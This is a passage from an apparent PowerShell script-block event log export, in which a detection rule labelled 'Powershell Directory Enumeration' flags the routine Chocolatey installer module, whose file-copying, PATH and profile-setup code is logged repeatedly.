([Security.Principal.WellKnownSidType]::LocalSystemSid) # get current user $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent() if ($currentUser.Name -eq $localSystem) { Write-Warning ""Not setting tab completion: Current user is SYSTEM user."" return } if (!(Test-Path($profileDirectory))) { Write-Debug ""Creating '$profileDirectory'"" New-Item ""$profileDirectory"" -Type Directory -Force -ErrorAction SilentlyContinue | Out-Null } if (!(Test-Path($profileFile))) { Write-Warning ""Not setting tab completion: Profile file does not exist at '$profileFile'."" return #Write-Debug ""Creating '$profileFile'"" #"""" | Out-File $profileFile -Encoding UTF8 } # Check authenticode, but only if file is greater than 4 bytes $profileFileInfo = New-Object System.IO.FileInfo($profileFile) if ($profileFileInfo.Length -ge 5) { $signature = Get-AuthenticodeSignature $profile if ($signature.Status -ne 'NotSigned') { Write-Warning ""Not setting tab completion: File is Authenticode signed at '$profile'."" return } } $profileInstall = @' # Chocolatey profile $ChocolateyProfile = ""$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"" if (Test-Path($ChocolateyProfile)) { Import-Module ""$ChocolateyProfile"" } '@ $chocoProfileSearch = '$ChocolateyProfile' if(Select-String -Path $profileFile -Pattern $chocoProfileSearch -Quiet -SimpleMatch) { Write-Debug ""Chocolatey profile is already installed."" return } Write-Output 'Adding Chocolatey to the profile. This will provide tab completion, refreshenv, etc.' $profileInstall | Out-File $profileFile -Append -Encoding (Get-FileEncoding $profileFile) Write-ChocolateyWarning 'Chocolatey profile installed. Reload your profile - type . $profile' if ($PSVersionTable.PSVersion.Major -lt 3) { Write-ChocolateyWar","MessageNumber: 2 ¦ MessageTotal: 4 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateysetup.psm1 ¦ ScriptBlockId: bb48825e-ea49-4f0d-bb5c-2b2443dd9239 ¦ ScriptBlockText: )?', '', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase) if ($updatedPath -ne $path) { Write-Output ""Updating `'$_`' PATH to reflect removal of '$chocolateyPathOld'."" try { Set-EnvironmentVariable -Name 'Path' -Value $updatedPath -Scope $_ -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove the old environment variable from PATH. You will need to do this manually"" } } } Copy-Item ""$chocolateyPathOld\lib\*"" ""$chocolateyPath\lib"" -force -recurse $from = ""$chocolateyPathOld\bin"" $to = ""$chocolateyPath\bin"" $exclude = @(""choco.exe"", ""chocolatey.exe"", ""cinst.exe"", ""clist.exe"", ""cpack.exe"", ""cpush.exe"", ""cuninst.exe"", ""cup.exe"", ""cver.exe"", ""RefreshEnv.cmd"") Get-ChildItem -Path $from -recurse -Exclude $exclude | % { Write-Debug ""Copying $_ `n to $to"" if ($_.PSIsContainer) { Copy-Item $_ -Destination (Join-Path $to $_.Parent.FullName.Substring($from.length)) -Force -ErrorAction SilentlyContinue } else { $fileToMove = (Join-Path $to $_.FullName.Substring($from.length)) try { Copy-Item $_ -Destination $fileToMove -Exclude $exclude -Force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to move `'$fileToMove`'. You may need to reinstall the shim"" } } } } } function Remove-OldChocolateyInstall { param( [string]$chocolateyPathOld = ""$sysDrive\Chocolatey"" ) Write-Debug ""Remove-OldChocolateyInstall"" if (Test-Path $chocolateyPathOld) { Write-ChocolateyWarning ""This action will result in Log Errors, you can safely ignore those. `n You may need to finish removing '$chocolateyPathOld' manually."" try { Get-ChildItem -Path ""$chocolateyPathOld"" | % { if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } Write-Output ""Attempting to remove `'$chocolateyPathOld`'. This may fail if something in the folder is being used or locked."" Remove-Item ""$($chocolateyPathOld)"" -force -recurse -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$chocolateyPathOld`'. You will need to manually remove it."" } } } function Install-ChocolateyFiles { param( [string]$chocolateyPath ) Write-Debug ""Install-ChocolateyFiles"" Write-Debug ""Removing install files in chocolateyInstall, helpers, redirects, and tools"" ""$chocolateyPath\chocolateyInstall"", ""$chocolateyPath\helpers"", ""$chocolateyPath\redirects"", ""$chocolateyPath\tools"" | % { #Write-Debug ""Checking path $_"" if (Test-Path $_) { Get-ChildItem -Path ""$_"" | % { #Write-Debug ""Checking child path $_ ($($_.FullName))"" if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } } } Write-Debug ""Attempting to move choco.exe to choco.exe.old so we can place the new version here."" # rename the currently running process / it will be locked if it exists $chocoExe = Join-Path $chocolateyPath 'choco.exe' if (Test-Path ($chocoExe)) { Write-Debug ""Renaming '$chocoExe' to '$chocoExe.old'"" try { Remove-Item ""$chocoExe.old"" -force -ErrorAction SilentlyContinue Move-Item $chocoExe ""$chocoExe.old"" -force -ErrorAction SilentlyContinue } catch { Write-ChocolateyWarning ""Was not able to rename `'$chocoExe`' to `'$chocoExe.old`'."" } } # remove pdb file if it is found $chocoPdb = Join-Path $chocolateyPath 'choco.pdb' if (Test-Path ($chocoPdb)) { Remove-Item ""$chocoPdb"" -Force -ErrorAction SilentlyContinue } Write-Debug ""Unpacking files required for Chocolatey."" $chocInstallFolder = Join-Path $thisScriptFolder ""chocolateyInstall"" $chocoExe = Join-Path $chocInstallFolder 'choco.exe' $chocoExeDest = Join-Path $chocolateyPath 'choco.exe' Copy-Item $chocoExe $chocoExeDest -force Write-Debug ""Copying the contents of `'$chocInstallFolder`' to `'$chocolateyPath`'."" Copy-Item $chocInstallFolder\* $chocolateyPath -Recurse -Force } function Ensure-ChocolateyLibFiles { param( [string]$chocolateyLibPath ) Write-Debug ""Ensure-ChocolateyLibFiles"" $chocoPkgDirectory = Join-Path $chocolateyLibPath 'chocolatey' Create-DirectoryIfNotExists $chocoPkgDirectory if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { Write-Output ""chocolatey.nupkg file not installed in lib.`n Attempting to locate it from bootstrapper."" $chocoZipFile = Join-Path $tempDir ""chocolatey\chocInstall\chocolatey.zip"" Write-Debug ""First the zip file at '$chocoZipFile'."" Write-Debug ""Then from a neighboring chocolatey.*nupkg file '$thisScriptFolder/../../'."" if (Test-Path(""$chocoZipFile"")) { Write-Debug ""Copying '$chocoZipFile' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item ""$chocoZipFile"" ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { $chocoPkg = Get-ChildItem ""$thisScriptFolder/../../"" | ?{$_.name -match ""^chocolatey.*nupkg"" } | Sort name -Descending | Select -First 1 if ($chocoPkg -ne '') { $chocoPkg = $chocoPkg.FullName } ""$chocoZipFile"", ""$chocoPkg"" | % { if ($_ -ne $null -and $_ -ne '') { if (Test-Path $_) { Write-Debug ""Copying '$_' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item $_ ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } } } } } } function Install-ChocolateyBinFiles { param( [string] $chocolateyPath, [string] $chocolateyExePath ) Write-Debug ""Install-ChocolateyBinFiles"" Write-Debug ""Installing the bin file redirects"" $redirectsPath = Join-Path $chocolateyPath 'redirects' if (!(Test-Path ""$redirectsPath"")) { Write-ChocolateyWarning ""$redirectsPath does not exist"" return } $exeFiles = Get-ChildItem ""$redirectsPath"" -include @(""*.exe"",""*.cmd"") -recurse foreach ($exeFile in $exeFiles) { $exeFilePath = $exeFile.FullName $exeFileName = [System.IO.Path]::GetFileName(""$exeFilePath"") $binFilePath = Join-Path $chocolateyExePath $exeFileName $binFilePathRename = $binFilePath + '.old' $batchFilePath = $binFilePath.Replace("".exe"","".bat"") $bashFilePath = $binFilePath.Replace("".exe"","""") if (Test-Path ($batchFilePath)) { Remove-Item $batchFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($bashFilePath)) { Remove-Item $bashFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($binFilePathRename)) { try { Write-Debug ""Attempting to remove $binFilePathRename"" Remove-Item $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$binFilePathRename`'. This may cause errors."" } } if (Test-Path ($binFilePath)) { try { Write-Debug ""Attempting to rename $binFilePath to $binFilePathRename"" Move-Item -path $binFilePath -destination $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to rename `'$binFilePath`' to `'$binFilePathRename`'."" } } try { Write-Debug ""Attempting to copy $exeFilePath to $binFilePath"" Copy-Item -path $exeFilePath -destination $binFilePath -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to replace `'$binFilePath`' with `'$exeFilePath`'. You may need to do this manually."" } $commandShortcut = [System.IO.Path]::GetFileNameWithoutExtension(""$exeFilePath"") Write-Debug ""Added command $commandShortcut"" } } function Initialize-ChocolateyPath { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Initialize-ChocolateyPath"" Write-Debug ""Initializing Chocolatey Path if required"" $environmentTarget = [System.EnvironmentVariableTarget]::User if (Test-ProcessAdminRights) { Write-Debug ""Administrator installing so using Machine environment variable target instead of User."" $environmentTarget = [System.EnvironmentVariableTarget]::Machine } else { Write-ChocolateyWarning ""Setting ChocolateyInstall Path on USER PATH and not SYSTEM Path.`n This is due to either non-administrator install OR the process you are running is not being run as an Administrator."" } Install-ChocolateyPath -pathToInstall ""$chocolateyExePath"" -pathType $environmentTarget } function Process-ChocolateyBinFiles { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Process-ChocolateyBinFiles"" $processedMarkerFile = Join-Path $chocolateyExePath '_processed.txt' if (!(test-path $processedMarkerFile)) { $files = get-childitem $chocolateyExePath -include *.bat -recurse if ($files -ne $null -and $files.Count -gt 0) { Write-Debug ""Processing Bin files"" foreach ($file in $files) { Write-Output ""Processing $($file.Name) to make it portable"" $fileStream = [System.IO.File]::Open(""$file"", 'Open', 'Read', 'ReadWrite') $reader = New-Object System.IO.StreamReader($fileStream) $fileText = $reader.ReadToEnd() $reader.Close() $fileStream.Close() $fileText = $fileText.ToLower().Replace(""`"""" + $chocolateyPath.ToLower(), ""SET DIR=%~dp0%`n""""%DIR%..\"").Replace(""\\"",""\"") Set-Content $file -Value $fileText -Encoding Ascii } } Set-Content $processedMarkerFile -Value ""$([System.DateTime]::Now.Date)"" -Encoding Ascii } } # Adapted from http://www.west-wind.com/Weblog/posts/197245.aspx function Get-FileEncoding($Path) { $bytes = [byte[]](Get-Content $Path -Encoding byte -ReadCount 4 -TotalCount 4) if(!$bytes) { return 'utf8' } switch -regex ('{0:x2}{1:x2}{2:x2}{3:x2}' -f $bytes[0],$bytes[1],$bytes[2],$bytes[3]) { '^efbbbf' { return 'utf8' } '^2b2f76' { return 'utf7' } '^fffe' { return 'unicode' } '^feff' { return 'bigendianunicode' } '^0000feff' { return 'utf32' } default { return 'ascii' } } } function Add-ChocolateyProfile { Write-Debug ""Add-ChocolateyProfile"" try { $profileFile = ""$profile"" if ($profileFile -eq $null -or $profileFile -eq '') { Write-Output 'Not setting tab completion: Profile variable ($profile) resulted in an empty string.' return } $profileDirectory = (Split-Path -Parent $profileFile) if ($env:ChocolateyNoProfile -ne $null -and $env:ChocolateyNoProfile -ne '') { Write-Warning ""Not setting tab completion: Environment variable ""ChocolateyNoProfile"" exists and is set."" return } $localSystem = Get-LocalizedWellKnownPrincipalName -WellKnownSidType ([Security.Principal.WellKnownSidType]::LocalSystemSid) # get current user $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent() if ($currentUser.Name -eq $localSystem) { Write-Warning ""Not setting tab completion: Current user is SYSTEM user."" return } if (!(Test-Path($profileDirectory))) { Write-Debug ""Creating '$profileDirectory'"" New-Item ""$profileDirectory"" -Type Directory -Force -ErrorAction SilentlyContinue | Out-Null } if (!(Test-Path($profileFile))) { Write-Warning ""Not setting tab completion: Profile file does not exist at '$profileFile'."" return #Write-Debug ""Creating '$profileFile'"" #"""" | Out-File $profileFile -Encoding UTF8 } # Check authenticode, but only if file is greater than 4 bytes $profileFileInfo = New-Object System.IO.FileInfo($profileFile) if ($profileFileInfo.Length -ge 5) { $signature = Get-AuthenticodeSignature $profile if ($signature.Status -ne 'NotSigned') { Write-Warning ""Not setting tab completion: File is Authenticode signed at '$profile'."" return } } $profileInstall = @' # Chocolatey profile $ChocolateyProfile = ""$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"" if (Test-Path($ChocolateyProfile)) { Import-Module ""$ChocolateyProfile"" } '@ $chocoProfileSearch = '$ChocolateyProfile' if(Select-String -Path $profileFile -Pattern $chocoProfileSearch -Quiet -SimpleMatch) { Write-Debug ""Chocolatey profile is already installed."" return } Write-Output 'Adding Chocolatey to the profile. This will provide tab completion, refreshenv, etc.' $profileInstall | Out-File $profileFile -Append -Encoding (Get-FileEncoding $profileFile) Write-ChocolateyWarning 'Chocolatey profile installed. Reload your profile - type . $profile' if ($PSVersionTable.PSVersion.Major -lt 3) { Write-ChocolateyWar","d7f88495-fd82-8062-2c13-6036a8358e39"
"2019-03-19 14:21:31.332 +01:00","Powershell Directory Enumeration","med","MSEDGEWIN10","PwSh",4104,54,"ScriptBlock: )?', '', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase) if ($updatedPath -ne $path) { Write-Output ""Updating `'$_`' PATH to reflect removal of '$chocolateyPathOld'."" try { Set-EnvironmentVariable -Name 'Path' -Value $updatedPath -Scope $_ -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove the old environment variable from PATH. You will need to do this manually"" } } } Copy-Item ""$chocolateyPathOld\lib\*"" ""$chocolateyPath\lib"" -force -recurse $from = ""$chocolateyPathOld\bin"" $to = ""$chocolateyPath\bin"" $exclude = @(""choco.exe"", ""chocolatey.exe"", ""cinst.exe"", ""clist.exe"", ""cpack.exe"", ""cpush.exe"", ""cuninst.exe"", ""cup.exe"", ""cver.exe"", ""RefreshEnv.cmd"") Get-ChildItem -Path $from -recurse -Exclude $exclude | % { Write-Debug ""Copying $_ `n to $to"" if ($_.PSIsContainer) { Copy-Item $_ -Destination (Join-Path $to $_.Parent.FullName.Substring($from.length)) -Force -ErrorAction SilentlyContinue } else { $fileToMove = (Join-Path $to $_.FullName.Substring($from.length)) try { Copy-Item $_ -Destination $fileToMove -Exclude $exclude -Force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to move `'$fileToMove`'. You may need to reinstall the shim"" } } } } } function Remove-OldChocolateyInstall { param( [string]$chocolateyPathOld = ""$sysDrive\Chocolatey"" ) Write-Debug ""Remove-OldChocolateyInstall"" if (Test-Path $chocolateyPathOld) { Write-ChocolateyWarning ""This action will result in Log Errors, you can safely ignore those. `n You may need to finish removing '$chocolateyPathOld' manually."" try { Get-ChildItem -Path ""$chocolateyPathOld"" | % { if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } Write-Output ""Attempting to remove `'$chocolateyPathOld`'. This may fail if something in the folder is being used or locked."" Remove-Item ""$($chocolateyPathOld)"" -force -recurse -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$chocolateyPathOld`'. You will need to manually remove it."" } } } function Install-ChocolateyFiles { param( [string]$chocolateyPath ) Write-Debug ""Install-ChocolateyFiles"" Write-Debug ""Removing install files in chocolateyInstall, helpers, redirects, and tools"" ""$chocolateyPath\chocolateyInstall"", ""$chocolateyPath\helpers"", ""$chocolateyPath\redirects"", ""$chocolateyPath\tools"" | % { #Write-Debug ""Checking path $_"" if (Test-Path $_) { Get-ChildItem -Path ""$_"" | % { #Write-Debug ""Checking child path $_ ($($_.FullName))"" if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } } } Write-Debug ""Attempting to move choco.exe to choco.exe.old so we can place the new version here."" # rename the currently running process / it will be locked if it exists $chocoExe = Join-Path $chocolateyPath 'choco.exe' if (Test-Path ($chocoExe)) { Write-Debug ""Renaming '$chocoExe' to '$chocoExe.old'"" try { Remove-Item ""$chocoExe.old"" -force -ErrorAction SilentlyContinue Move-Item $chocoExe ""$chocoExe.old"" -force -ErrorAction SilentlyContinue } catch { Write-ChocolateyWarning ""Was not able to rename `'$chocoExe`' to `'$chocoExe.old`'."" } } # remove pdb file if it is found $chocoPdb = Join-Path $chocolateyPath 'choco.pdb' if (Test-Path ($chocoPdb)) { Remove-Item ""$chocoPdb"" -Force -ErrorAction SilentlyContinue } Write-Debug ""Unpacking files required for Chocolatey."" $chocInstallFolder = Join-Path $thisScriptFolder ""chocolateyInstall"" $chocoExe = Join-Path $chocInstallFolder 'choco.exe' $chocoExeDest = Join-Path $chocolateyPath 'choco.exe' Copy-Item $chocoExe $chocoExeDest -force Write-Debug ""Copying the contents of `'$chocInstallFolder`' to `'$chocolateyPath`'."" Copy-Item $chocInstallFolder\* $chocolateyPath -Recurse -Force } function Ensure-ChocolateyLibFiles { param( [string]$chocolateyLibPath ) Write-Debug ""Ensure-ChocolateyLibFiles"" $chocoPkgDirectory = Join-Path $chocolateyLibPath 'chocolatey' Create-DirectoryIfNotExists $chocoPkgDirectory if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { Write-Output ""chocolatey.nupkg file not installed in lib.`n Attempting to locate it from bootstrapper."" $chocoZipFile = Join-Path $tempDir ""chocolatey\chocInstall\chocolatey.zip"" Write-Debug ""First the zip file at '$chocoZipFile'."" Write-Debug ""Then from a neighboring chocolatey.*nupkg file '$thisScriptFolder/../../'."" if (Test-Path(""$chocoZipFile"")) { Write-Debug ""Copying '$chocoZipFile' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item ""$chocoZipFile"" ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { $chocoPkg = Get-ChildItem ""$thisScriptFolder/../../"" | ?{$_.name -match ""^chocolatey.*nupkg"" } | Sort name -Descending | Select -First 1 if ($chocoPkg -ne '') { $chocoPkg = $chocoPkg.FullName } ""$chocoZipFile"", ""$chocoPkg"" | % { if ($_ -ne $null -and $_ -ne '') { if (Test-Path $_) { Write-Debug ""Copying '$_' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item $_ ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } } } } } } function Install-ChocolateyBinFiles { param( [string] $chocolateyPath, [string] $chocolateyExePath ) Write-Debug ""Install-ChocolateyBinFiles"" Write-Debug ""Installing the bin file redirects"" $redirectsPath = Join-Path $chocolateyPath 'redirects' if (!(Test-Path ""$redirectsPath"")) { Write-ChocolateyWarning ""$redirectsPath does not exist"" return } $exeFiles = Get-ChildItem ""$redirectsPath"" -include @(""*.exe"",""*.cmd"") -recurse foreach ($exeFile in $exeFiles) { $exeFilePath = $exeFile.FullName $exeFileName = [System.IO.Path]::GetFileName(""$exeFilePath"") $binFilePath = Join-Path $chocolateyExePath $exeFileName $binFilePathRename = $binFilePath + '.old' $batchFilePath = $binFilePath.Replace("".exe"","".bat"") $bashFilePath = $binFilePath.Replace("".exe"","""") if (Test-Path ($batchFilePath)) { Remove-Item $batchFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($bashFilePath)) { Remove-Item $bashFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($binFilePathRename)) { try { Write-Debug ""Attempting to remove $binFilePathRename"" Remove-Item $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$binFilePathRename`'. This may cause errors."" } } if (Test-Path ($binFilePath)) { try { Write-Debug ""Attempting to rename $binFilePath to $binFilePathRename"" Move-Item -path $binFilePath -destination $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to rename `'$binFilePath`' to `'$binFilePathRename`'."" } } try { Write-Debug ""Attempting to copy $exeFilePath to $binFilePath"" Copy-Item -path $exeFilePath -destination $binFilePath -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to replace `'$binFilePath`' with `'$exeFilePath`'. You may need to do this manually."" } $commandShortcut = [System.IO.Path]::GetFileNameWithoutExtension(""$exeFilePath"") Write-Debug ""Added command $commandShortcut"" } } function Initialize-ChocolateyPath { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Initialize-ChocolateyPath"" Write-Debug ""Initializing Chocolatey Path if required"" $environmentTarget = [System.EnvironmentVariableTarget]::User if (Test-ProcessAdminRights) { Write-Debug ""Administrator installing so using Machine environment variable target instead of User."" $environmentTarget = [System.EnvironmentVariableTarget]::Machine } else { Write-ChocolateyWarning ""Setting ChocolateyInstall Path on USER PATH and not SYSTEM Path.`n This is due to either non-administrator install OR the process you are running is not being run as an Administrator."" } Install-ChocolateyPath -pathToInstall ""$chocolateyExePath"" -pathType $environmentTarget } function Process-ChocolateyBinFiles { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Process-ChocolateyBinFiles"" $processedMarkerFile = Join-Path $chocolateyExePath '_processed.txt' if (!(test-path $processedMarkerFile)) { $files = get-childitem $chocolateyExePath -include *.bat -recurse if ($files -ne $null -and $files.Count -gt 0) { Write-Debug ""Processing Bin files"" foreach ($file in $files) { Write-Output ""Processing $($file.Name) to make it portable"" $fileStream = [System.IO.File]::Open(""$file"", 'Open', 'Read', 'ReadWrite') $reader = New-Object System.IO.StreamReader($fileStream) $fileText = $reader.ReadToEnd() $reader.Close() $fileStream.Close() $fileText = $fileText.ToLower().Replace(""`"""" + $chocolateyPath.ToLower(), ""SET DIR=%~dp0%`n""""%DIR%..\"").Replace(""\\"",""\"") Set-Content $file -Value $fileText -Encoding Ascii } } Set-Content $processedMarkerFile -Value ""$([System.DateTime]::Now.Date)"" -Encoding Ascii } } # Adapted from http://www.west-wind.com/Weblog/posts/197245.aspx function Get-FileEncoding($Path) { $bytes = [byte[]](Get-Content $Path -Encoding byte -ReadCount 4 -TotalCount 4) if(!$bytes) { return 'utf8' } switch -regex ('{0:x2}{1:x2}{2:x2}{3:x2}' -f $bytes[0],$bytes[1],$bytes[2],$bytes[3]) { '^efbbbf' { return 'utf8' } '^2b2f76' { return 'utf7' } '^fffe' { return 'unicode' } '^feff' { return 'bigendianunicode' } '^0000feff' { return 'utf32' } default { return 'ascii' } } } function Add-ChocolateyProfile { Write-Debug ""Add-ChocolateyProfile"" try { $profileFile = ""$profile"" if ($profileFile -eq $null -or $profileFile -eq '') { Write-Output 'Not setting tab completion: Profile variable ($profile) resulted in an empty string.' return } $profileDirectory = (Split-Path -Parent $profileFile) if ($env:ChocolateyNoProfile -ne $null -and $env:ChocolateyNoProfile -ne '') { Write-Warning ""Not setting tab completion: Environment variable ""ChocolateyNoProfile"" exists and is set."" return } $localSystem = Get-LocalizedWellKnownPrincipalName -WellKnownSidType ([Security.Principal.WellKnownSidType]::LocalSystemSid) # get current user $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent() if ($currentUser.Name -eq $localSystem) { Write-Warning ""Not setting tab completion: Current user is SYSTEM user."" return } if (!(Test-Path($profileDirectory))) { Write-Debug ""Creating '$profileDirectory'"" New-Item ""$profileDirectory"" -Type Directory -Force -ErrorAction SilentlyContinue | Out-Null } if (!(Test-Path($profileFile))) { Write-Warning ""Not setting tab completion: Profile file does not exist at '$profileFile'."" return #Write-Debug ""Creating '$profileFile'"" #"""" | Out-File $profileFile -Encoding UTF8 } # Check authenticode, but only if file is greater than 4 bytes $profileFileInfo = New-Object System.IO.FileInfo($profileFile) if ($profileFileInfo.Length -ge 5) { $signature = Get-AuthenticodeSignature $profile if ($signature.Status -ne 'NotSigned') { Write-Warning ""Not setting tab completion: File is Authenticode signed at '$profile'."" return } } $profileInstall = @' # Chocolatey profile $ChocolateyProfile = ""$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"" if (Test-Path($ChocolateyProfile)) { Import-Module ""$ChocolateyProfile"" } '@ $chocoProfileSearch = '$ChocolateyProfile' if(Select-String -Path $profileFile -Pattern $chocoProfileSearch -Quiet -SimpleMatch) { Write-Debug ""Chocolatey profile is already installed."" return } Write-Output 'Adding Chocolatey to the profile. This will provide tab completion, refreshenv, etc.' $profileInstall | Out-File $profileFile -Append -Encoding (Get-FileEncoding $profileFile) Write-ChocolateyWarning 'Chocolatey profile installed. Reload your profile - type . $profile' if ($PSVersionTable.PSVersion.Major -lt 3) { Write-ChocolateyWar","MessageNumber: 2 ¦ MessageTotal: 4 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateysetup.psm1 ¦ ScriptBlockId: bb48825e-ea49-4f0d-bb5c-2b2443dd9239 ¦ ScriptBlockText: )?', '', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase) if ($updatedPath -ne $path) { Write-Output ""Updating `'$_`' PATH to reflect removal of '$chocolateyPathOld'."" try { Set-EnvironmentVariable -Name 'Path' -Value $updatedPath -Scope $_ -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove the old environment variable from PATH. You will need to do this manually"" } } } Copy-Item ""$chocolateyPathOld\lib\*"" ""$chocolateyPath\lib"" -force -recurse $from = ""$chocolateyPathOld\bin"" $to = ""$chocolateyPath\bin"" $exclude = @(""choco.exe"", ""chocolatey.exe"", ""cinst.exe"", ""clist.exe"", ""cpack.exe"", ""cpush.exe"", ""cuninst.exe"", ""cup.exe"", ""cver.exe"", ""RefreshEnv.cmd"") Get-ChildItem -Path $from -recurse -Exclude $exclude | % { Write-Debug ""Copying $_ `n to $to"" if ($_.PSIsContainer) { Copy-Item $_ -Destination (Join-Path $to $_.Parent.FullName.Substring($from.length)) -Force -ErrorAction SilentlyContinue } else { $fileToMove = (Join-Path $to $_.FullName.Substring($from.length)) try { Copy-Item $_ -Destination $fileToMove -Exclude $exclude -Force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to move `'$fileToMove`'. You may need to reinstall the shim"" } } } } } function Remove-OldChocolateyInstall { param( [string]$chocolateyPathOld = ""$sysDrive\Chocolatey"" ) Write-Debug ""Remove-OldChocolateyInstall"" if (Test-Path $chocolateyPathOld) { Write-ChocolateyWarning ""This action will result in Log Errors, you can safely ignore those. `n You may need to finish removing '$chocolateyPathOld' manually."" try { Get-ChildItem -Path ""$chocolateyPathOld"" | % { if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } Write-Output ""Attempting to remove `'$chocolateyPathOld`'. This may fail if something in the folder is being used or locked."" Remove-Item ""$($chocolateyPathOld)"" -force -recurse -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$chocolateyPathOld`'. You will need to manually remove it."" } } } function Install-ChocolateyFiles { param( [string]$chocolateyPath ) Write-Debug ""Install-ChocolateyFiles"" Write-Debug ""Removing install files in chocolateyInstall, helpers, redirects, and tools"" ""$chocolateyPath\chocolateyInstall"", ""$chocolateyPath\helpers"", ""$chocolateyPath\redirects"", ""$chocolateyPath\tools"" | % { #Write-Debug ""Checking path $_"" if (Test-Path $_) { Get-ChildItem -Path ""$_"" | % { #Write-Debug ""Checking child path $_ ($($_.FullName))"" if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } } } Write-Debug ""Attempting to move choco.exe to choco.exe.old so we can place the new version here."" # rename the currently running process / it will be locked if it exists $chocoExe = Join-Path $chocolateyPath 'choco.exe' if (Test-Path ($chocoExe)) { Write-Debug ""Renaming '$chocoExe' to '$chocoExe.old'"" try { Remove-Item ""$chocoExe.old"" -force -ErrorAction SilentlyContinue Move-Item $chocoExe ""$chocoExe.old"" -force -ErrorAction SilentlyContinue } catch { Write-ChocolateyWarning ""Was not able to rename `'$chocoExe`' to `'$chocoExe.old`'."" } } # remove pdb file if it is found $chocoPdb = Join-Path $chocolateyPath 'choco.pdb' if (Test-Path ($chocoPdb)) { Remove-Item ""$chocoPdb"" -Force -ErrorAction SilentlyContinue } Write-Debug ""Unpacking files required for Chocolatey."" $chocInstallFolder = Join-Path $thisScriptFolder ""chocolateyInstall"" $chocoExe = Join-Path $chocInstallFolder 'choco.exe' $chocoExeDest = Join-Path $chocolateyPath 'choco.exe' Copy-Item $chocoExe $chocoExeDest -force Write-Debug ""Copying the contents of `'$chocInstallFolder`' to `'$chocolateyPath`'."" Copy-Item $chocInstallFolder\* $chocolateyPath -Recurse -Force } function Ensure-ChocolateyLibFiles { param( [string]$chocolateyLibPath ) Write-Debug ""Ensure-ChocolateyLibFiles"" $chocoPkgDirectory = Join-Path $chocolateyLibPath 'chocolatey' Create-DirectoryIfNotExists $chocoPkgDirectory if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { Write-Output ""chocolatey.nupkg file not installed in lib.`n Attempting to locate it from bootstrapper."" $chocoZipFile = Join-Path $tempDir 